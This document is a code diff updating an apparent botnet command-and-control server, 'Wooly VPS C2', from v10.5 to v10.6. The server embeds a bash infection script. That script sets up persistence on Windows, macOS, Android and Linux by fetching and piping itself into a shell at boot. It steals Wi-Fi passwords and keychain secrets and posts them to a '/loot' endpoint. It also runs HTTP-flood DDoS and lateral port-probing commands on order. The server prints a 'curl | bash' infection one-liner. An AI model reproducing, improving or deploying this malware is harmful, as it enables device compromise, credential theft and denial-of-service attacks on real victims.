@@ -1,10 +1,19 @@
 #!/usr/bin/env python3
-# Wooly VPS C2 v10.5 - PORT FAILSAFE
-import os, ssl, socket, json, subprocess, threading, time
+# Wooly VPS C2 v10.6 - PUBLIC IP AUTO
+import os, ssl, socket, json, subprocess, threading, time, requests
 from http.server import HTTPServer, BaseHTTPRequestHandler
 from urllib.parse import urlparse, parse_qs
 from datetime import datetime
 from html import escape
+
+# AUTO PUBLIC IP
+def get_public_ip():
+    try:
+        return requests.get('https://ipinfo.io/ip', timeout=5).text.strip()
+    except:
+        return socket.gethostbyname(socket.gethostname())
+
+PUBLIC_IP = get_public_ip()
 
 INFECT_SH = '''#!/bin/bash
 readonly VPS_C2="$(curl -s ipinfo.io/ip 2>/dev/null || echo 127.0.0.1)"
@@ -12,52 +21,52 @@ readonly C2_PORT=443
 readonly BOT_ID=$(printf '%s-%s-%s' "$(uname -s 2>/dev/null||echo unknown)" "$(hostname 2>/dev/null||echo unknown)" "$(whoami 2>/dev/null||echo root)" | sha256sum 2>/dev/null|cut -c1-16|tr -d '\\n')
 readonly PAYLOAD_DIR="/dev/shm/.wpa_$$"
 
-detect_platform() {
+detect_platform() {{
     command -v powershell >/dev/null 2>&1 && echo "windows" && return
     command -v getprop >/dev/null 2>&1 && echo "android" && return
     [[ "$OSTYPE" =~ darwin ]] && echo "macos" && return
     [[ -f /proc/version ]] && echo "linux" && return
     echo "iot"
-}
+}}
 
-persist_silent() {
+persist_silent() {{
     local plat=$(detect_platform)
     case $plat in
-        windows) powershell -c "schtasks /create /tn 'NetworkService' /tr \"powershell -ep bypass -c \\\"curl https://$VPS_C2:$C2_PORT/infect.sh|iex\\\" \" /sc onstart /ru system /f" >/dev/null 2>&1 ;;
+        windows) powershell -c "schtasks /create /tn 'NetworkService' /tr \\\"powershell -ep bypass -c \\\\\\\"curl https://$VPS_C2:$C2_PORT/infect.sh|iex\\\\\\\" \\\" /sc onstart /ru system /f" >/dev/null 2>&1 ;;
         macos) echo "@reboot curl -fsSL https://$VPS_C2:$C2_PORT/infect.sh|bash" >> ~/.bash_profile 2>/dev/null ;;
         android) echo "* * * * * curl -fsSL https://$VPS_C2:$C2_PORT/infect.sh|bash >/dev/null 2>&1" >> /data/local/tmp/cron 2>/dev/null ;;
         linux|iot) (crontab -l 2>/dev/null; echo "@reboot curl -fsSL https://$VPS_C2:$C2_PORT/infect.sh|bash >/dev/null 2>&1") | crontab - ;;
     esac >/dev/null 2>&1
-}
+}}
 
-steal_loot() {
+steal_loot() {{
     local plat=$(detect_platform); local loot=""
     case $plat in
         linux) loot=$(nmcli -t -f NAME,UUID dev wifi 2>/dev/null; grep psk= /etc/NetworkManager/system-connections/* 2>/dev/null | cut -d= -f2) ;;
         macos) loot=$(security find-generic-password -ga "*" 2>/dev/null 2>&1 | grep "password:" | cut -d'"' -f4) ;;
         android|iot) loot=$(grep psk= /data/misc/wifi/wpa_supplicant.conf 2>/dev/null 2>&1 | cut -d= -f2) ;;
     esac
-    [[ -n "$loot" ]] && curl -s -d "{\"bot\":\"$BOT_ID\",\"data\":\"$loot\"}" "https://$VPS_C2:$C2_PORT/loot" --insecure >/dev/null 2>&1
-}
+    [[ -n "$loot" ]] && curl -s -d "{{\\"bot\\":\\"$BOT_ID\\",\\"data\\":\\"$loot\\"}}" "https://$VPS_C2:$C2_PORT/loot" --insecure >/dev/null 2>&1
+}}
 
-c2_silent() {
+c2_silent() {{
     local cmd=$(echo -e "GET /cmd?bot=$BOT_ID HTTP/1.1\\r\\nHost: $VPS_C2:$C2_PORT\\r\\nConnection: close\\r\\n\\r\\n" | 
                 timeout 10 nc -w3 "$VPS_C2" "$C2_PORT" 2>/dev/null | sed '1,/^$/d' | tr -d '\\r\\n ' | head -c 100)
     case $cmd in
-        "ddos:"*) local target="${cmd#ddos:}"; timeout "${cmd#*:}" bash -c "while true; do echo -e 'GET / HTTP/1.1\\r\\nHost: $target\\r\\n\\r\\n' | nc $target 80; done" >/dev/null 2>&1 & ;;
+        "ddos:"*) local target=${{cmd#ddos:}}; timeout ${{cmd#*:}} bash -c "while true; do echo -e 'GET / HTTP/1.1\\r\\nHost: $target\\r\\n\\r\\n' | nc $target 80; done" >/dev/null 2>&1 & ;;
         "steal") steal_loot ;;
         "scan") arp -a >/dev/null 2>&1 ;;
-        "propagate") arp -a 2>/dev/null | awk '{print $2}' | tr -d '()' | grep -E '^[0-9]' | xargs -I {} -P5 timeout 3 nc -w2 {} 22 8080 >/dev/null 2>&1 & ;;
+        "propagate") arp -a 2>/dev/null | awk '{print $2}' | tr -d '()' | grep -E '^[0-9]' | xargs -I {{}} -P5 timeout 3 nc -w2 {{}} 22 8080 >/dev/null 2>&1 & ;;
     esac
-}
+}}
 
-main_silent() {
+main_silent() {{
     mkdir -p "$PAYLOAD_DIR" 2>/dev/null
     persist_silent
     echo -e "POST /checkin HTTP/1.1\\r\\nHost: $VPS_C2:$C2_PORT\\r\\nContent-Length: 64\\r\\n\\r\\nbot_id=$BOT_ID&os=$(detect_platform)&ip=$(curl -s ipinfo.io/ip||echo local)" |
     nc -w10 "$VPS_C2" "$C2_PORT" >/dev/null 2>&1
     while true; do c2_silent; steal_loot; sleep $((RANDOM%180+120)); done >/dev/null 2>&1
-}
+}}
 main_silent'''
 
 bots = {}
@@ -88,11 +97,12 @@ class C2Server(BaseHTTPRequestHandler):
             self.wfile.write(commands.pop(bot_id, b'ping').encode())
             
         elif '/bots' in self.path:
-            hostname = socket.gethostbyname(socket.gethostname())
-            html = f'''<!DOCTYPE html><html><head><title>🤖 Wooly C2 v10.5 ({len(bots)} bots)</title>
+            hostname = PUBLIC_IP  # ✅ PUBLIC IP!
+            html = f'''<!DOCTYPE html><html><head><title>🤖 Wooly C2 v10.6 ({len(bots)} bots)</title>
 <meta name="viewport" content="width=device-width,initial-scale=1">
-<style>body{{font-family:monospace;background:#000;color:lime;padding:20px}}input,select,button{{background:#111;color:lime;border:1px solid lime;padding:12px;width:100%;margin:5px 0;box-sizing:border-box}}pre{{background:#111;padding:15px;max-height:40vh;overflow:auto}}</style></head>
-<body><h1>🤖 <b style="color:lime">{len(bots)}</b> Bots Online - Port {self.server.server_port}</h1>
+<style>body{{font-family:monospace;background:#000;color:lime;padding:20px}}input,select,button{{background:#111;color:lime;border:1px solid lime;padding:12px;width:100%;margin:5px 0;box-sizing:border-box}}pre{{background:#111;padding:15px;max-height:40vh;overflow:auto}}.big-ip{{font-size:24px;color:cyan}}</style></head>
+<body><h1>🤖 <b style="color:lime">{len(bots)}</b> Bots Online</h1>
+<div class="big-ip">🌐 PUBLIC: https://{hostname}:{self.server.server_port}/bots</div>
 <pre>{escape(json.dumps(bots, indent=2))}</pre>
 <h2>📡 Send Commands:</h2><form method=POST action=/cmd>
 <input name="bot_id" value="ALL" placeholder="Bot ID or ALL"><br>
@@ -156,15 +166,15 @@ def gen_ssl():
         print("🔒 SSL generated")
 
 if __name__ == '__main__':
+    print(f"🌐 PUBLIC IP: {PUBLIC_IP}")
     gen_ssl()
-    port = find_free_port(8443)  # ✅ AUTO PORT!
+    port = find_free_port(8443)
     httpd = HTTPServer(('0.0.0.0', port), C2Server)
     context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
     context.load_cert_chain('server.crt', 'server.key')
     httpd.socket = context.wrap_socket(httpd.socket, server_side=True)
     
-    hostname = socket.gethostbyname(socket.gethostname())
-    print(f"🚀 C2 v10.5 → https://0.0.0.0:{port}")
-    print(f"📱 Dashboard: https://{hostname}:{port}/bots")
-    print(f"📥 Payload: curl -k https://{hostname}:{port}/infect.sh | bash")
+    print(f"🚀 C2 v10.6 → https://0.0.0.0:{port}")
+    print(f"📱 PUBLIC Dashboard: https://{PUBLIC_IP}:{port}/bots")
+    print(f"📥 PUBLIC Payload: curl -k https://{PUBLIC_IP}:{port}/infect.sh | bash")
     httpd.serve_forever()
